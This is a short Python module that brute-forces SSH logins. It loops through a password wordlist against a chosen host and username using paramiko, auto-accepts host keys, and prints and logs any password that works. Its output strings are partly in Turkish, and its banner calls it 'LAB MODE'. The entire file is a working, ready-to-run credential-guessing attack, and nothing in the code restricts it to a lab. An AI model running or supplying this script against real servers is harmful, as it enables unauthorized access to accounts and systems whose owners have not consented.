import paramiko
from core import log

def attempt(host, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password, timeout=3)
        client.close()
        return True
    except:
        return False

def brute(host, username, wordlist):
    print(f"\n[+] SSH brute-force (LAB MODE) → {username}@{host}\n")

    with open(wordlist, "r", encoding="utf-8") as f:
        passwords = f.read().splitlines()

    for pw in passwords:
        print(f"Deniyor: {pw}", end="\r")
        if attempt(host, username, pw):
            print(f"\n[SUCCESS] Şifre bulundu: {pw}")
            log("ssh", {"host": host, "user": username, "password": pw})
            return

    print("\n[-] wordlist içinde doğru şifre bulunamadı.")
